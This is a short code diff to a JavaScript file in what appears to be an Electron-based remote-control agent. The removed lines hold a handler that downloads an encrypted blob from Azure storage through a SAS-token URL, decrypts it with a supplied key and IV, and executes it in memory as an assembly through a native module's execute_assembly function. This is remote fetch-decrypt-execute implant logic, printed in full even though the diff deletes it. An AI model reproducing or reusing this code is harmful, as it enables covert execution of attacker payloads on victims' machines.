@@ -48,43 +48,6 @@ async function func_Web_Request(options, data = null, isBytes=false) {
   
   }
 }
-ipcRenderer.on('do-assembly', async (event, container, args, scexecblob, key,iv) => {
-    try
-    {
-        func_log(`browser.js | Hit IPC do-assembly | ${container} ${scexecblob}`);
-        let assemblyoutput = await func_Azure_Assembly_Download_Exec(container,scexecblob,key,iv,args);
-        ipcRenderer.send('end-file-op','do-assembly',assemblyoutput,key,iv);
-    }catch(error)
-    {
-        func_log(`Error in IPC do-assembly : ${error} ${error.stack}`);
-    }
-});
-async function func_Azure_Assembly_Download_Exec(containerName, scexecblob, key,iv,args) 
-{
-  // Construct the URL
-  let output = "";
-  const sasUrl = `https://${storageAccount}/${containerName}/${scexecblob}?${sasToken}`;
-  func_log(`browser.js | func_Azure_Assembly_Download_Exec | key : ${key} | iv : ${iv}`);
-  key = Buffer.from(key, 'hex');
-  iv  = Buffer.from(iv,  'hex');
-
-  let response = await fetch(sasUrl);
-  if (!response.ok) {
-    output = `Couldn't download file, response: ${response.status}`;
-    func_log( output );
-  }else
-  {
-    func_log(`response.ok : ${response.ok}`);
-    let arrayBuffer = await response.arrayBuffer();
-    buffer          = Buffer.from(arrayBuffer);
-    raw             = await func_Decrypt( buffer, key, iv );
-    let assemblyNodePath = await ipcRenderer.invoke('get-global-path', 'assemblyNodePath');
-    let x = require(assemblyNodePath);
-    const argv = await func_Split_Quoted_String(args);
-    let aoutput = x.execute_assembly(raw, argv);
-    return aoutput;
-  }
-}
 ipcRenderer.on('do-node-load', async (event,nodepath) => {
     try
     {
